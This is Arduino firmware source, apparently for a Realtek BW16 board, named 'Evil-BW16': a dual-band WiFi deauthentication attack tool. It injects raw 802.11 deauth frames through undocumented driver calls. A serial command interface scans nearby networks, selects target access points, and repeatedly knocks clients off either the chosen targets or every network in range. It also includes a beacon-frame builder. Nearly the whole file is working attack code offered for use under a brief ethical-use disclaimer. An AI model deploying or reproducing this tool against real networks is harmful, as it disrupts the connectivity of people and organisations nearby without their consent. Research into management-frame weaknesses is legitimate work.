/*
   Evil-BW16 - WiFi Dual band deauther

   Copyright (c) 2024 7h30th3r0n3

   Permission is hereby granted, free of charge, to any person obtaining a copy
   of this software and associated documentation files (the "Software"), to deal
   in the Software without restriction, including without limitation the rights
   to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
   copies of the Software, and to permit persons to whom the Software is
   furnished to do so, subject to the following conditions:

   The above copyright notice and this permission notice shall be included in all
   copies or substantial portions of the Software.

   THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
   IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
   FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
   AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
   LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
   OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
   SOFTWARE.

   Disclaimer:
   This tool, Evil-BW16, is developed for educational and ethical testing purposes only.
   Any misuse or illegal use of this tool is strictly prohibited. The creator of Evil-BW16
   assumes no liability and is not responsible for any misuse or damage caused by this tool.
   Users are required to comply with all applicable laws and regulations in their jurisdiction
   regarding network testing and ethical hacking.
*/



#include <Arduino.h>
#include <vector>
#include "wifi_conf.h"
#include "wifi_util.h"
#include "wifi_structures.h"
#include "WiFi.h"

// Define the SSID, password, and channel for AP that started as Hidden (needed to send frames)
#define WIFI_SSID "7h30th3r0n35Ghz"
#define WIFI_PASS "5Ghz7h30th3r0n3Pass"
#define WIFI_CHANNEL 1


bool USE_LED = true; // Flag to enable or disable LED

uint8_t dst_mac[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF}; // sending deauth to broadcast
unsigned long last_cycle = 0;
unsigned long cycle_delay = 2000; // delay between scan/deauth cycle 0 for continious deauth
unsigned long scan_time = 5000; // Wifi scan duration
unsigned long num_send_frames = 3; // number of frames send per AP
int start_channel = 1; // 2.4ghz+5ghz = 1 // 5ghz only = 36
bool scan_between_cycles = false;  // scan between cycle or stay on same APs until new scan

typedef struct {
  uint16_t frame_control = 0xC0;
  uint16_t duration = 0xFFFF;
  uint8_t destination[6];
  uint8_t source[6];
  uint8_t access_point[6];
  const uint16_t sequence_number = 0;
  uint16_t reason = 0x06;
} DeauthFrame;

typedef struct {
  uint16_t frame_control = 0x80;
  uint16_t duration = 0;
  uint8_t destination[6];
  uint8_t source[6];
  uint8_t access_point[6];
  const uint16_t sequence_number = 0;
  const uint64_t timestamp = 0;
  uint16_t beacon_interval = 0x64;
  uint16_t ap_capabilities = 0x21;
  const uint8_t ssid_tag = 0;
  uint8_t ssid_length = 0;
  uint8_t ssid[255];
} BeaconFrame;

struct WiFiScanResult {
  bool selected = false;
  String ssid;
  String bssid_str;
  uint8_t bssid[6];
  short rssi;
  uint channel;
};

extern uint8_t* rltk_wlan_info;
extern "C" void* alloc_mgtxmitframe(void* ptr);
extern "C" void update_mgntframe_attrib(void* ptr, void* frame_control);
extern "C" int dump_mgntframe(void* ptr, void* frame_control);

void wifi_tx_raw_frame(void* frame, size_t length);
void wifi_tx_deauth_frame(void* src_mac, void* dst_mac, uint16_t reason = 0x06);
void wifi_tx_beacon_frame(void* src_mac, void* dst_mac, const char *ssid);

void wifi_tx_raw_frame(void* frame, size_t length) {
  void *ptr = (void *)**(uint32_t **)(rltk_wlan_info + 0x10);
  void *frame_control = alloc_mgtxmitframe(ptr + 0xae0);

  if (frame_control != 0) {
    update_mgntframe_attrib(ptr, frame_control + 8);
    memset((void *) * (uint32_t *)(frame_control + 0x80), 0, 0x68);
    uint8_t *frame_data = (uint8_t *) * (uint32_t *)(frame_control + 0x80) + 0x28;
    memcpy(frame_data, frame, length);
    *(uint32_t *)(frame_control + 0x14) = length;
    *(uint32_t *)(frame_control + 0x18) = length;
    dump_mgntframe(ptr, frame_control);
  }
}

void wifi_tx_deauth_frame(void* src_mac, void* dst_mac, uint16_t reason) {
  DeauthFrame frame;
  memcpy(&frame.source, src_mac, 6);
  memcpy(&frame.access_point, src_mac, 6);
  memcpy(&frame.destination, dst_mac, 6);
  frame.reason = reason;
  wifi_tx_raw_frame(&frame, sizeof(DeauthFrame));
}

void wifi_tx_beacon_frame(void* src_mac, void* dst_mac, const char *ssid) {
  BeaconFrame frame;
  memcpy(&frame.source, src_mac, 6);
  memcpy(&frame.access_point, src_mac, 6);
  memcpy(&frame.destination, dst_mac, 6);
  for (int i = 0; ssid[i] != '\0'; i++) {
    frame.ssid[i] = ssid[i];
    frame.ssid_length++;
  }
  wifi_tx_raw_frame(&frame, 38 + frame.ssid_length);
}

void sortByChannel(std::vector<WiFiScanResult> &results) {
  for (size_t i = 0; i < results.size(); i++) {
    size_t min_idx = i;
    for (size_t j = i + 1; j < results.size(); j++) {
      if (results[j].channel < results[min_idx].channel) {
        min_idx = j;
      }
    }
    if (min_idx != i) {
      WiFiScanResult temp = results[i];
      results[i] = results[min_idx];
      results[min_idx] = temp;
    }
  }
}

std::vector<WiFiScanResult> scan_results;

rtw_result_t scanResultHandler(rtw_scan_handler_result_t *scan_result) {
  if (scan_result->scan_complete == 0) {
    rtw_scan_result_t *record = &scan_result->ap_details;
    record->SSID.val[record->SSID.len] = 0;

    // Check channel: keep only 5 GHz APs
    if (record->channel >= start_channel) {
      WiFiScanResult result;
      result.ssid = String((const char*) record->SSID.val);
      result.channel = record->channel;
      result.rssi = record->signal_strength;
      memcpy(&result.bssid, &record->BSSID, 6);

      char bssid_str[20];
      snprintf(bssid_str, sizeof(bssid_str), "%02X:%02X:%02X:%02X:%02X:%02X",
               result.bssid[0], result.bssid[1], result.bssid[2],
               result.bssid[3], result.bssid[4], result.bssid[5]);
      result.bssid_str = bssid_str;
      scan_results.push_back(result);
    }

  } else {
    // Scan complete
  }
  return RTW_SUCCESS;
}

int scanNetworks() {
  Serial.println("Starting WiFi scan...");
  scan_results.clear();
  if (wifi_scan_networks(scanResultHandler, NULL) == RTW_SUCCESS) {
    if (USE_LED) digitalWrite(LED_G, HIGH);
    delay(scan_time); // Wait for scan to complete
    Serial.println("Scan completed!");

    // Call custom sorting function
    sortByChannel(scan_results);
    if (USE_LED) digitalWrite(LED_G, LOW);
    return 0;
  } else {
    Serial.println("Failed to start the scan!");
    return 1;
  }
}

// Function to display scan results
void printScanResults() {
  Serial.println("Detected networks:");
  for (size_t i = 0; i < scan_results.size(); i++) {
    String freq = (scan_results[i].channel >= 36) ? "5GHz" : "2.4GHz";
    Serial.print(i);
    Serial.print("\tSSID: ");
    Serial.print(scan_results[i].ssid);
    Serial.print("\tBSSID: ");
    Serial.print(scan_results[i].bssid_str);
    Serial.print("\tChannel: ");
    Serial.print(scan_results[i].channel);
    Serial.print("\tRSSI: ");
    Serial.print(scan_results[i].rssi);
    Serial.print(" dBm\t");
    Serial.println(freq);
  }
}

// State variables
bool attack_enabled = false;
bool scan_enabled = false;
bool target_mode = false;
std::vector<WiFiScanResult> target_aps;

void handleCommand(String command) {
  command.trim(); // Remove trailing newline or spaces

  if (command.equalsIgnoreCase("start")) {
    attack_enabled = true;
    Serial.println("[INFO] Attack started.");
  } else if (command.equalsIgnoreCase("stop")) {
    attack_enabled = false;
    target_mode = false;
    target_aps.clear();
    Serial.println("[INFO] Attack stopped.");
  } else if (command.equalsIgnoreCase("scan")) {
    scan_enabled = true;
    Serial.println("[INFO] Starting scan...");
    if (scanNetworks() == 0) {
      printScanResults();
      scan_enabled = false;
      Serial.println("[INFO] Scan completed.");
    } else {
      Serial.println("[ERROR] Scan failed.");
    }
  } else if (command.startsWith("set")) {
    String setting = command.substring(4);
    setting.trim();
    int space_index = setting.indexOf(' ');
    if (space_index != -1) {
      String key = setting.substring(0, space_index);
      String value = setting.substring(space_index + 1);
      unsigned long new_value = value.toInt();

      if (key.equalsIgnoreCase("cycle_delay")) {
        cycle_delay = new_value;
        Serial.println("[INFO] Updated cycle_delay to " + String(cycle_delay) + " ms.");
      } else if (key.equalsIgnoreCase("scan_time")) {
        scan_time = new_value;
        Serial.println("[INFO] Updated scan_time to " + String(scan_time) + " ms.");
      } else if (key.equalsIgnoreCase("num_frames")) {
        num_send_frames = new_value;
        Serial.println("[INFO] Updated num_send_frames to " + String(num_send_frames) + ".");
      } else if (key.equalsIgnoreCase("start_channel")) {
        start_channel = new_value;
        Serial.println("[INFO] Updated start_channel to " + String(start_channel) + ".");
      } else if (key.equalsIgnoreCase("scan_cycles")) {
        if (value.equalsIgnoreCase("on")) {
          scan_between_cycles = true;
          Serial.println("[INFO] Scan between attack cycles activated.");
        } else if (value.equalsIgnoreCase("off")) {
          scan_between_cycles = false;
          Serial.println("[INFO] Scan between attack cycles deactivated.");
        } else {
          Serial.println("[ERROR] Invalid value for scan_between_cycles. Use 'on' or 'off'.");
        }
      } else if (key.equalsIgnoreCase("led")) {
        if (value.equalsIgnoreCase("on")) {
          USE_LED = true;
          Serial.println("[INFO] LEDs activated.");
        } else if (value.equalsIgnoreCase("off")) {
          USE_LED = false;
          Serial.println("[INFO] LEDs deactivated.");
        } else {
          Serial.println("[ERROR] Invalid value for LED. Use 'set led on' or 'set led off'.");
        }
      } else if (key.equalsIgnoreCase("target")) {
        // Parse the target AP indices
        target_aps.clear();
        value.trim();
        while (value.length() > 0) {
          int comma_index = value.indexOf(',');
          String index_str = (comma_index == -1) ? value : value.substring(0, comma_index);
          int target_index = index_str.toInt();
          if (target_index >= 0 && target_index < scan_results.size()) {
            target_aps.push_back(scan_results[target_index]);
          } else {
            Serial.println("[ERROR] Invalid target index: " + index_str);
          }
          value = (comma_index == -1) ? "" : value.substring(comma_index + 1);
        }

        if (!target_aps.empty()) {
          target_mode = true;
          Serial.println("[INFO] Targeting the following APs:");
          for (size_t i = 0; i < target_aps.size(); i++) {
            Serial.print("- SSID: ");
            Serial.print(target_aps[i].ssid);
            Serial.print(" BSSID: ");
            Serial.println(target_aps[i].bssid_str);
          }
        } else {
          target_mode = false;
          Serial.println("[ERROR] No valid targets selected.");
        }
      } else {
        Serial.println("[ERROR] Unknown setting: " + key);
      }
    } else {
      Serial.println("[ERROR] Invalid format. Use: set <key> <value>");
    }
  } else if (command.equalsIgnoreCase("info")) {
    // Affichage des informations de la configuration actuelle
    Serial.println("[INFO] Current Configuration:");
    Serial.println("Cycle Delay: " + String(cycle_delay) + " ms");
    Serial.println("Scan Time: " + String(scan_time) + " ms");
    Serial.println("Number of Frames per AP: " + String(num_send_frames));
    Serial.println("Start Channel: " + String(start_channel));
    Serial.println("Scan between attack cycles: " + String(scan_between_cycles ? "Enabled" : "Disabled"));

    if (target_mode) {
      Serial.println("[INFO] Targeted APs:");
      for (size_t i = 0; i < target_aps.size(); i++) {
        Serial.print("- SSID: ");
        Serial.print(target_aps[i].ssid);
        Serial.print(" BSSID: ");
        Serial.println(target_aps[i].bssid_str);
      }
    } else {
      Serial.println("[INFO] No APs targeted.");
    }
  } else if (command.equalsIgnoreCase("help")) {
    Serial.println("[HELP] Available commands:");
    Serial.println("- start: Begin the attack cycle.");
    Serial.println("- stop: Stop the attack cycle.");
    Serial.println("- scan: Perform a WiFi scan and display results.");
    Serial.println("- set <key> <value>: Update configuration values:");
    Serial.println("  * target <indices>: Set target APs by their indices, e.g., 'set target 1,3,5'.");
    Serial.println("  * cycle_delay (ms): Delay between scan/deauth cycles.");
    Serial.println("  * scan_time (ms): Duration of WiFi scans.");
    Serial.println("  * num_frames: Number of frames sent per AP.");
    Serial.println("  * start_channel: Start channel for scanning (1 or 36).");
    Serial.println("  * scan_cycles: on/off - Enable or disable scan between attack cycles.");
    Serial.println("  * led on/off: Enable or disable LEDs.");
    Serial.println("- info: Display the current configuration.");
    Serial.println("- help: Display this help message.");
  } else {
    Serial.println("[ERROR] Unknown command. Type 'help' for a list of commands.");
  }
}



void targetAttack() {
  if (target_mode && attack_enabled) {
    for (size_t i = 0; i < target_aps.size(); i++) {
      wifi_set_channel(target_aps[i].channel);

      for (int j = 0; j < num_send_frames; j++) {
        wifi_tx_deauth_frame(target_aps[i].bssid, dst_mac, 2);
        if (USE_LED) {
          digitalWrite(LED_B, HIGH);
          delay(50);
          digitalWrite(LED_B, LOW);
        }
        Serial.print("Deauth frame ");
        Serial.print(j + 1);
        Serial.print(" sent to ");
        Serial.print(target_aps[i].ssid);
        Serial.print(" (");
        Serial.print(target_aps[i].bssid_str);
        Serial.print(") on channel ");
        Serial.println(target_aps[i].channel);
      }
    }
  }
}

void generalAttack() {
  if (!target_mode && attack_enabled) {
    attackCycle(); // Reuse the existing attack logic for all scanned APs
  }
}

void attackCycle() {
  Serial.println("Starting attack cycle...");

  uint8_t currentChannel = 0xFF; // Initial value outside valid range

  for (size_t i = 0; i < scan_results.size(); i++) {
    uint8_t targetChannel = scan_results[i].channel;
    // Change channel only if target channel is different from the current one
    if (targetChannel != currentChannel) {
      wifi_set_channel(targetChannel);
      currentChannel = targetChannel;
    }

    for (int j = 0; j < num_send_frames; j++) {
      wifi_tx_deauth_frame(scan_results[i].bssid, dst_mac, 2);
      if (USE_LED) {
        digitalWrite(LED_B, HIGH);
        delay(50);
        digitalWrite(LED_B, LOW);
      }
      Serial.print("Deauth frame ");
      Serial.print(j + 1);
      Serial.print(" sent to ");
      Serial.print(scan_results[i].ssid);
      Serial.print(" (");
      Serial.print(scan_results[i].bssid_str);
      Serial.print(") on channel ");
      Serial.println(scan_results[i].channel);
    }
  }

  Serial.println("Attack cycle completed.");
}

void setup() {
  Serial.begin(115200);

  if (USE_LED) {
    pinMode(LED_R, OUTPUT);
    pinMode(LED_G, OUTPUT);
    pinMode(LED_B, OUTPUT);

    // Rouge ON, autres OFF
    digitalWrite(LED_R, HIGH);
    delay(200);
    digitalWrite(LED_R, LOW);

    // Vert ON, autres OFF
    digitalWrite(LED_G, HIGH);
    delay(200);
    digitalWrite(LED_G, LOW);

    // Bleu ON, autres OFF
    digitalWrite(LED_B, HIGH);
    delay(200);
    digitalWrite(LED_B, LOW);

    // Rouge + Vert (jaune)
    digitalWrite(LED_R, HIGH);
    digitalWrite(LED_G, HIGH);
    delay(200);
    digitalWrite(LED_R, LOW);
    digitalWrite(LED_G, LOW);

    // Vert + Bleu (cyan)
    digitalWrite(LED_G, HIGH);
    digitalWrite(LED_B, HIGH);
    delay(200);
    digitalWrite(LED_G, LOW);
    digitalWrite(LED_B, LOW);

    // Rouge + Bleu (magenta)
    digitalWrite(LED_R, HIGH);
    digitalWrite(LED_B, HIGH);
    delay(200);
    digitalWrite(LED_R, LOW);
    digitalWrite(LED_B, LOW);

    // Rouge + Vert + Bleu (blanc)
    digitalWrite(LED_R, HIGH);
    digitalWrite(LED_G, HIGH);
    digitalWrite(LED_B, HIGH);
    delay(200);
    digitalWrite(LED_R, LOW);
    digitalWrite(LED_G, LOW);
    digitalWrite(LED_B, LOW);
  }

  Serial.println("Initializing WiFi in hidden AP mode...");
  wifi_on(RTW_MODE_AP);
  wifi_start_ap_with_hidden_ssid(WIFI_SSID, RTW_SECURITY_WPA2_AES_PSK, WIFI_PASS, 11, 18, WIFI_CHANNEL);
  Serial.println("Hidden AP started. Selected channel: " + String(WIFI_CHANNEL));

  last_cycle = millis();
}

void loop() {
  // Handle commands from Serial
  if (Serial.available()) {
    String command = Serial.readStringUntil('\n');
    handleCommand(command);
  }

  // Execute attack cycles based on state
  if (millis() - last_cycle > cycle_delay) {
    if (attack_enabled) {
      // Perform scan between attack cycles if enabled
      if (scan_between_cycles) {
        Serial.println("[INFO] Starting scan between attack cycles...");
        if (scanNetworks() == 0) {
          printScanResults();
        } else {
          Serial.println("[ERROR] Scan failed.");
        }
      }

      if (target_mode) {
        targetAttack();  // Attack specific targets if target_mode is enabled
      } else {
        generalAttack();  // General attack if no specific targets are set
      }
    }
    last_cycle = millis();
  }
}
